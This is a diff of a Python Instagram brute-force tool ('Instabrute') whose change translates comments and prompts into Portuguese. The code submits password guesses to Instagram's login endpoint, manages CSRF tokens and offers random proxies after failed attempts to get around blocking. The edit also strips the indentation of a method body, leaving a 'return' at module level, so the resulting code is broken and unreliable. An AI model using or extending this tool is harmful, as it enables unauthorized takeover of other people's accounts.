@@ -123,26 +123,27 @@ class Instabrute():
         r = sess.get('https://www.instagram.com/')
         sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})
 
-        # Update token after login to the site
-        r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username': self.username, 'password': password}, allow_redirects=True)
-        sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})
+# Atualiza o token após o login no site
+r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username': self.username, 'password': password}, allow_redirects=True)
+sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})
 
-        # Parse the response
- data = json.loads(r.text)
-        if data['status'] == 'fail':
-            print(data['message'])
+# Analisa a resposta
+data = json.loads(r.text)
 
-            UseProxy = Input('[*] Do you want to use a proxy (y/n): ').upper()
-            if UseProxy == 'Y' or UseProxy == 'YES':
-                print('[$] Try to use proxy after fail.')
-                self.randomProxy()  # Verifique isso, pode conter bugs
-            return False
+if data['status'] == 'fail':
+    print(data['message'])
 
-        # Retorna a sessão se a senha estiver correta
-        if data['authenticated'] == True:
-            return sess
-        else:
-            return False
+    UseProxy = Input('[*] Você deseja usar um proxy (s/n): ').upper()
+    if UseProxy == 'S' or UseProxy == 'SIM':
+        print('[$] Tentando usar um proxy após a falha.')
+        self.randomProxy()  # Verifique isso, pode conter erros
+    return False
+
+# Retorna a sessão se a senha estiver correta
+if data['authenticated'] == True:
+    return sess
+else:
+    return False
 
 print("""\033[32;1m
    mm.           dM8
